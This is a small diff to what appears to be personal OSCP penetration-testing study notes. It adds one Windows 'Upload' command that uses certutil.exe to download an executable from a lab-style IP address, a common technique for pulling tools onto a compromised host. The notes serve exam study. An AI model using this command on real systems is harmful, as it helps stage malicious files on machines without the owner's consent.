@@ -1,6 +1,13 @@
 # OSCP
 
 
+
+Upload:-
+
+	Windows:-
+		certutil.exe -urlcache -split -f "http://192.168.49.178/file.exe
+
+
 Linux commands:-
 
 	text:-
